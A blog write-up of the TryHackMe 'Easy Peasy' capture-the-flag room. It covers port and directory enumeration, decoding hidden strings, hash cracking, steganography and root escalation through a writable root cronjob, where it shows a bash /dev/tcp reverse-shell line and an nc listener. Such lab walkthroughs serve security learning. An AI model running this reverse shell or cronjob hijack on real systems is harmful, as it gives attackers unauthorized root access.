<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><title>/dev/blog - TryHackMe - Easy Peasy</title><meta name="description" content="Writeup for the TryHackMe room Easy Peasy, a CTF like voulerable machine."/><link rel="icon" href="/favicon.ico"/><meta name="next-head-count" content="5"/><link rel="preload" href="/_next/static/css/d206db58d2194450.css" as="style"/><link rel="stylesheet" href="/_next/static/css/d206db58d2194450.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-69bfa6990bb9e155.js" defer=""></script><script src="/_next/static/chunks/framework-1f10003e17636e37.js" defer=""></script><script src="/_next/static/chunks/main-fc7d2f0e2098927e.js" defer=""></script><script src="/_next/static/chunks/pages/_app-43ac001d99fedbd3.js" defer=""></script><script src="/_next/static/chunks/814-5321687895e5b29b.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bpath%5D-4279e18e005f30e3.js" defer=""></script><script src="/_next/static/MnC4eJ4ih-P5gsZqaS6Kc/_buildManifest.js" defer=""></script><script src="/_next/static/MnC4eJ4ih-P5gsZqaS6Kc/_ssgManifest.js" defer=""></script><script src="/_next/static/MnC4eJ4ih-P5gsZqaS6Kc/_middlewareManifest.js" defer=""></script></head><body><div id="__next"><header class="p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96"><nav class="flex flex-row"><a href="/"><h1 class=" text-4xl font-extrabold tracking-tight sm:text-5xl md:text-6xl">/dev/blog</h1></a><ul class="flex flex-row flex-grow items-end justify-evenly"><a href="/posts"><li class="underline">Posts</li></a><a href="/notes"><li class="">Notes</li></a></ul></nav></header><main class="flex justify-center p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96"><article class="max-w-full grow flex flex-col justify-self-start"><blockquote><p class="mb-2 inline text-sm sm:text-base xl:text-lg">The room link can be found at <!-- --><a title="" class="text-secondary-700 visited:text-secondary-900 font-bold hover:underline" href="https://tryhackme.com/room/easypeasyctf">TryHackMe - Easy Peasy<!-- --></a></p></blockquote><h2 class="mb-4 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl">Enumeration<!-- --></h2><p class="mb-2 inline text-sm sm:text-base xl:text-lg">First we scan for open ports and services<!-- --></p><h3 class="mb-4 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl">Nmap<!-- --></h3><p class="mb-2 inline text-sm sm:text-base xl:text-lg">We use nmap with some default arguments.<!-- --></p><pre class="overflow-auto"><code>sudo nmap -sV -sC -oA nmap/first $IP
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">It will return.<!-- --></p><pre class="overflow-auto"><code>PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">From the first scan we can see that port <!-- -->80<!-- --> is open with <!-- --><strong>nginx<!-- --></strong> version<!-- -->
<!-- -->1.16.1<!-- --></p><h4 class="mb-4 text-xl font-semibold tracking-tight sm:text-2xl md:text-3xl">All ports<!-- --></h4><p class="mb-2 inline text-sm sm:text-base xl:text-lg">So let<!-- -->’<!-- -->s retry for all ports <!-- -->-p-<!-- --> in the background, using <!-- -->-v<!-- --> to increase the<!-- -->
<!-- -->verbosity and removing the scripts <!-- -->-sC<!-- --> and version <!-- -->-sV<!-- --> parameters.<!-- --></p><pre class="overflow-auto"><code>sudo nmap -v -p- -oA nmap/all $IP
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">This returns three ports open<!-- --></p><pre class="overflow-auto"><code>PORT      STATE SERVICE
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  unknown
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Let<!-- -->’<!-- -->s try to gather more information from those ports, scanning only those<!-- -->
<!-- -->specifically.<!-- --></p><pre class="overflow-auto"><code>sudo nmap -sC -sV -oA nmap/ports -p 80,65524,6498 $IP
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">The output is the following<!-- --></p><pre class="overflow-auto"><code>PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">So summing up we have:<!-- --></p><ol start="1" class="list-decimal list-inside"><li>HTTP port 80 with nginx<!-- --></li><li>SSH port 6498 with OpenSSH<!-- --></li><li>HTTP port 65524 with Apache<!-- --></li></ol><h3 class="mb-4 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl">Gobuster<!-- --></h3><p class="mb-2 inline text-sm sm:text-base xl:text-lg">While scanning for other open ports let<!-- -->’<!-- -->s start <!-- --><strong>gobuster<!-- --></strong> to enumerate<!-- -->
<!-- -->directories on http port <!-- -->80<!-- -->. We will use the <!-- --><a title="" class="text-secondary-700 visited:text-secondary-900 font-bold hover:underline" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt">Seclist big<!-- --></a> wordlist.<!-- --></p><pre class="overflow-auto"><code>gobuster dir -o gobuster/nginx -w big.txt -u http://$IP/
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Gobuster finds an <!-- -->hidden<!-- --> directory.<!-- --></p><pre class="overflow-auto"><code>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$IP/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 13:50:37 Starting gobuster
===============================================================
/hidden (Status: 301)
/robots.txt (Status: 200)
===============================================================
2020/08/10 13:54:18 Finished
===============================================================
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Let<!-- -->’<!-- -->s also scan the Apache server.<!-- --></p><pre class="overflow-auto"><code>gobuster dir -o gobuster/apache -w big.txt -u http://$IP:65524/
<!-- --></code></pre><pre class="overflow-auto"><code>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$IP:65524/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 13:54:08 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/08/10 13:57:18 Finished
===============================================================
<!-- --></code></pre><h2 class="mb-4 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl">Compromising<!-- --></h2><p class="mb-2 inline text-sm sm:text-base xl:text-lg">The second fase is a bit more confusing and the directions to find the flags<!-- -->
<!-- -->aren<!-- -->’<!-- -->t clear, but the access on the box is and privilege escalation is straight<!-- -->
<!-- -->forward.<!-- --></p><h3 class="mb-4 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl">Flag 1<!-- --></h3><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Futher enumerating the <!-- -->hidden<!-- --> directory with gobuster we find another<!-- -->
<!-- -->directory called <!-- -->wathever<!-- -->.<!-- --></p><pre class="overflow-auto"><code>gobuster dir -o gobuster/hidden -w big.txt -u http://$IP/hidden/
<!-- --></code></pre><pre class="overflow-auto"><code>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$IP/hidden/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 14:13:44 Starting gobuster
===============================================================
/whatever (Status: 301)
===============================================================
2020/08/10 14:16:48 Finished
===============================================================
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Viewing the source code of the page there is an hidden <!-- -->p<!-- --> with a <!-- --><strong>base64<!-- --></strong>
<!-- -->encoded string.<!-- --></p><pre class="overflow-auto"><code>&lt;p hidden&gt;Z____________________Q==&lt;/p&gt;
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Decoding it we can find the first flag.<!-- --></p><pre class="overflow-auto"><code>echo Z____________________Q== | base64 -d

flag{__________}
<!-- --></code></pre><h3 class="mb-4 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl">Flag 2<!-- --></h3><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Using gobuster we have found <!-- -->robots.txt<!-- --> in the Apache server which shous us<!-- -->
<!-- --><strong>User-Agent<!-- --></strong>.<!-- --></p><pre class="overflow-auto"><code>User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a______________________________0
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">The solution wasn<!-- -->’<!-- -->t so good. You have to find the solution online in some <!-- -->
<!-- -->obscure site searching for the hash :thinking:<!-- -->…<!-- --></p><pre class="overflow-auto"><code>flag{______________}
<!-- --></code></pre><h3 class="mb-4 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl">Flag 3<!-- --></h3><p class="mb-2 inline text-sm sm:text-base xl:text-lg">On the Apache home page we can find the third flag.<!-- --></p><pre class="overflow-auto"><code>Fl4g 3 : flag{________________________________}
<!-- --></code></pre><h3 class="mb-4 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl">User Flag<!-- --></h3><p class="mb-2 inline text-sm sm:text-base xl:text-lg">On the Apache main page in the source we can see an hidden <!-- -->p<!-- --> again.<!-- --></p><pre class="overflow-auto"><code>&lt;p hidden&gt;its encoded with ba....:O______________________u&lt;/p&gt;
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Since it is encoded with a base we open <!-- --><a title="" class="text-secondary-700 visited:text-secondary-900 font-bold hover:underline" href="https://gchq.github.io/CyberChef/">Chyberchef<!-- --></a> and try out a bunch of encodings.<!-- --></p><p class="mb-2 inline text-sm sm:text-base xl:text-lg">With <!-- -->base62<!-- --> we can find something that looks like an hidden directory.<!-- --></p><pre class="overflow-auto"><code>/n0th1ng3ls3m4tt3r
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">On this page we find a long string and an image.<!-- --></p><pre class="overflow-auto"><code>&lt;p&gt;9______________________________________________________________1&lt;/p&gt;
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">The hint tell us that it<!-- -->’<!-- -->s GHOST, so we use <!-- -->hashcat<!-- --> and the wordlist that was<!-- -->
<!-- -->provided to crack it.<!-- --></p><pre class="overflow-auto"><code>hashcat -a 0 -m 6900 hash.txt easypeasy.txt
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">With a bit of guessing we can use <!-- -->steghide<!-- --> on the image to extract some data.<!-- --></p><pre class="overflow-auto"><code>steghide extract -sf binarycodepixabay.jpg -p mypasswordforthatjob
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">The output are user and password information, the password is encoded in binary.<!-- --></p><pre class="overflow-auto"><code>username:b____g
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Using Cyberchef we can get the credentials.<!-- --></p><pre class="overflow-auto"><code>username: b____g
password: i__________________________y
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Those are the credentials for the SSH. So when you access you can find the user<!-- -->
<!-- -->flag.<!-- --></p><pre class="overflow-auto"><code>User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a______________y}
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Which is a <!-- -->rot13<!-- --> of <!-- -->flag{________________}<!-- -->.<!-- --></p><h3 class="mb-4 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl">Root Flag<!-- --></h3><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Uploading <!-- --><a title="" class="text-secondary-700 visited:text-secondary-900 font-bold hover:underline" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">Linpeas<!-- --></a>
<!-- -->on the box we can find a cronjob that is run as root and execute a script<!-- -->
<!-- -->/var/www/.mysecretcronjob.sh<!-- -->.<!-- --></p><pre class="overflow-auto"><code>* *    * * *   root    cd /var/www/ &amp;&amp; sudo bash .mysecretcronjob.sh
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">We can put a reverse shell in the script to gain root access on the box.<!-- --></p><pre class="overflow-auto"><code>bash -i &gt;&amp; /dev/tcp/$USER_IP/9000 0&gt;&amp;1
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Open a listener and wait for the job to fire.<!-- --></p><pre class="overflow-auto"><code>nc -lvnp 9000
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">The root flag is in a file <!-- -->/root/.root.txt<!-- --></p><pre class="overflow-auto"><code>flag{________________________________}
<!-- --></code></pre></article></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"TryHackMe - Easy Peasy","tags":["CTF","THM"],"description":"Writeup for the TryHackMe room Easy Peasy, a CTF like voulerable machine.","language":null,"content":[{"Start":"BlockQuote"},{"Start":"Paragraph"},{"Text":"The room link can be found at "},{"Start":{"Link":["Inline","https://tryhackme.com/room/easypeasyctf",""]}},{"Text":"TryHackMe - Easy Peasy"},{"End":{"Link":["Inline","https://tryhackme.com/room/easypeasyctf",""]}},{"End":"Paragraph"},{"End":"BlockQuote"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Enumeration"},{"End":{"Heading":["H2",null,[]]}},{"Start":"Paragraph"},{"Text":"First we scan for open ports and services"},{"End":"Paragraph"},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Nmap"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"We use nmap with some default arguments."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"sudo nmap -sV -sC -oA nmap/first $IP\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"It will return."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"nmap"}}},{"Text":"PORT   STATE SERVICE VERSION\n80/tcp open  http    nginx 1.16.1\n| http-robots.txt: 1 disallowed entry\n|_/\n|_http-server-header: nginx/1.16.1\n|_http-title: Welcome to nginx!\n"},{"End":{"CodeBlock":{"Fenced":"nmap"}}},{"Start":"Paragraph"},{"Text":"From the first scan we can see that port "},{"Code":"80"},{"Text":" is open with "},{"Start":"Strong"},{"Text":"nginx"},{"End":"Strong"},{"Text":" version"},"SoftBreak",{"Code":"1.16.1"},{"End":"Paragraph"},{"Start":{"Heading":["H4",null,[]]}},{"Text":"All ports"},{"End":{"Heading":["H4",null,[]]}},{"Start":"Paragraph"},{"Text":"So let"},{"Text":"’"},{"Text":"s retry for all ports "},{"Code":"-p-"},{"Text":" in the background, using "},{"Code":"-v"},{"Text":" to increase the"},"SoftBreak",{"Text":"verbosity and removing the scripts "},{"Code":"-sC"},{"Text":" and version "},{"Code":"-sV"},{"Text":" parameters."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"sudo nmap -v -p- -oA nmap/all $IP\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"This returns three ports open"},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"nmap"}}},{"Text":"PORT      STATE SERVICE\n80/tcp    open  http\n6498/tcp  open  unknown\n65524/tcp open  unknown\n"},{"End":{"CodeBlock":{"Fenced":"nmap"}}},{"Start":"Paragraph"},{"Text":"Let"},{"Text":"’"},{"Text":"s try to gather more information from those ports, scanning only those"},"SoftBreak",{"Text":"specifically."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"sudo nmap -sC -sV -oA nmap/ports -p 80,65524,6498 $IP\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"The output is the following"},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"nmap"}}},{"Text":"PORT      STATE SERVICE VERSION\n80/tcp    open  http    nginx 1.16.1\n| http-robots.txt: 1 disallowed entry\n|_/\n|_http-server-header: nginx/1.16.1\n|_http-title: Welcome to nginx!\n6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)\n|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)\n|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)\n65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))\n| http-robots.txt: 1 disallowed entry\n|_/\n|_http-server-header: Apache/2.4.43 (Ubuntu)\n|_http-title: Apache2 Debian Default Page: It works\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"},{"End":{"CodeBlock":{"Fenced":"nmap"}}},{"Start":"Paragraph"},{"Text":"So summing up we have:"},{"End":"Paragraph"},{"Start":{"List":1}},{"Start":"Item"},{"Text":"HTTP port 80 with nginx"},{"End":"Item"},{"Start":"Item"},{"Text":"SSH port 6498 with OpenSSH"},{"End":"Item"},{"Start":"Item"},{"Text":"HTTP port 65524 with Apache"},{"End":"Item"},{"End":{"List":1}},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Gobuster"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"While scanning for other open ports let"},{"Text":"’"},{"Text":"s start "},{"Start":"Strong"},{"Text":"gobuster"},{"End":"Strong"},{"Text":" to enumerate"},"SoftBreak",{"Text":"directories on http port "},{"Code":"80"},{"Text":". We will use the "},{"Start":{"Link":["Inline","https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt",""]}},{"Text":"Seclist big"},{"End":{"Link":["Inline","https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt",""]}},{"Text":" wordlist."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"gobuster dir -o gobuster/nginx -w big.txt -u http://$IP/\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"Gobuster finds an "},{"Code":"hidden"},{"Text":" directory."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"gobuster"}}},{"Text":"===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://$IP/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/big.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/08/10 13:50:37 Starting gobuster\n===============================================================\n/hidden (Status: 301)\n/robots.txt (Status: 200)\n===============================================================\n2020/08/10 13:54:18 Finished\n===============================================================\n"},{"End":{"CodeBlock":{"Fenced":"gobuster"}}},{"Start":"Paragraph"},{"Text":"Let"},{"Text":"’"},{"Text":"s also scan the Apache server."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"gobuster dir -o gobuster/apache -w big.txt -u http://$IP:65524/\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":{"CodeBlock":{"Fenced":"gobuster"}}},{"Text":"===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://$IP:65524/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/big.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/08/10 13:54:08 Starting gobuster\n===============================================================\n/.htaccess (Status: 403)\n/.htpasswd (Status: 403)\n/robots.txt (Status: 200)\n/server-status (Status: 403)\n===============================================================\n2020/08/10 13:57:18 Finished\n===============================================================\n"},{"End":{"CodeBlock":{"Fenced":"gobuster"}}},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Compromising"},{"End":{"Heading":["H2",null,[]]}},{"Start":"Paragraph"},{"Text":"The second fase is a bit more confusing and the directions to find the flags"},"SoftBreak",{"Text":"aren"},{"Text":"’"},{"Text":"t clear, but the access on the box is and privilege escalation is straight"},"SoftBreak",{"Text":"forward."},{"End":"Paragraph"},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Flag 1"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"Futher enumerating the "},{"Code":"hidden"},{"Text":" directory with gobuster we find another"},"SoftBreak",{"Text":"directory called "},{"Code":"wathever"},{"Text":"."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"gobuster dir -o gobuster/hidden -w big.txt -u http://$IP/hidden/\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":{"CodeBlock":{"Fenced":"gobuster"}}},{"Text":"===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://$IP/hidden/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/big.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/08/10 14:13:44 Starting gobuster\n===============================================================\n/whatever (Status: 301)\n===============================================================\n2020/08/10 14:16:48 Finished\n===============================================================\n"},{"End":{"CodeBlock":{"Fenced":"gobuster"}}},{"Start":"Paragraph"},{"Text":"Viewing the source code of the page there is an hidden "},{"Code":"p"},{"Text":" with a "},{"Start":"Strong"},{"Text":"base64"},{"End":"Strong"},"SoftBreak",{"Text":"encoded string."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"html"}}},{"Text":"\u003cp hidden\u003eZ____________________Q==\u003c/p\u003e\n"},{"End":{"CodeBlock":{"Fenced":"html"}}},{"Start":"Paragraph"},{"Text":"Decoding it we can find the first flag."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"echo Z____________________Q== | base64 -d\n\nflag{__________}\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Flag 2"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"Using gobuster we have found "},{"Code":"robots.txt"},{"Text":" in the Apache server which shous us"},"SoftBreak",{"Start":"Strong"},{"Text":"User-Agent"},{"End":"Strong"},{"Text":"."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"User-Agent:*\nDisallow:/\nRobots Not Allowed\nUser-Agent:a______________________________0\nAllow:/\nThis Flag Can Enter But Only This Flag No More Exceptions\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"The solution wasn"},{"Text":"’"},{"Text":"t so good. You have to find the solution online in some "},"SoftBreak",{"Text":"obscure site searching for the hash :thinking:"},{"Text":"…"},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"flag{______________}\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Flag 3"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"On the Apache home page we can find the third flag."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"Fl4g 3 : flag{________________________________}\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":{"Heading":["H3",null,[]]}},{"Text":"User Flag"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"On the Apache main page in the source we can see an hidden "},{"Code":"p"},{"Text":" again."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"html"}}},{"Text":"\u003cp hidden\u003eits encoded with ba....:O______________________u\u003c/p\u003e\n"},{"End":{"CodeBlock":{"Fenced":"html"}}},{"Start":"Paragraph"},{"Text":"Since it is encoded with a base we open "},{"Start":{"Link":["Inline","https://gchq.github.io/CyberChef/",""]}},{"Text":"Chyberchef"},{"End":{"Link":["Inline","https://gchq.github.io/CyberChef/",""]}},{"Text":" and try out a bunch of encodings."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"With "},{"Code":"base62"},{"Text":" we can find something that looks like an hidden directory."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"/n0th1ng3ls3m4tt3r\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"On this page we find a long string and an image."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"html"}}},{"Text":"\u003cp\u003e9______________________________________________________________1\u003c/p\u003e\n"},{"End":{"CodeBlock":{"Fenced":"html"}}},{"Start":"Paragraph"},{"Text":"The hint tell us that it"},{"Text":"’"},{"Text":"s GHOST, so we use "},{"Code":"hashcat"},{"Text":" and the wordlist that was"},"SoftBreak",{"Text":"provided to crack it."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"hashcat -a 0 -m 6900 hash.txt easypeasy.txt\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"With a bit of guessing we can use "},{"Code":"steghide"},{"Text":" on the image to extract some data."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"steghide extract -sf binarycodepixabay.jpg -p mypasswordforthatjob\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"The output are user and password information, the password is encoded in binary."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"username:b____g\npassword:\n01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"Using Cyberchef we can get the credentials."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"username: b____g\npassword: i__________________________y\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"Those are the credentials for the SSH. So when you access you can find the user"},"SoftBreak",{"Text":"flag."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"User Flag But It Seems Wrong Like It`s Rotated Or Something\nsynt{a______________y}\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"Which is a "},{"Code":"rot13"},{"Text":" of "},{"Code":"flag{________________}"},{"Text":"."},{"End":"Paragraph"},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Root Flag"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"Uploading "},{"Start":{"Link":["Inline","https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite",""]}},{"Text":"Linpeas"},{"End":{"Link":["Inline","https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite",""]}},"SoftBreak",{"Text":"on the box we can find a cronjob that is run as root and execute a script"},"SoftBreak",{"Code":"/var/www/.mysecretcronjob.sh"},{"Text":"."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"crontab"}}},{"Text":"* *    * * *   root    cd /var/www/ \u0026\u0026 sudo bash .mysecretcronjob.sh\n"},{"End":{"CodeBlock":{"Fenced":"crontab"}}},{"Start":"Paragraph"},{"Text":"We can put a reverse shell in the script to gain root access on the box."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"bash -i \u003e\u0026 /dev/tcp/$USER_IP/9000 0\u003e\u00261\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"Open a listener and 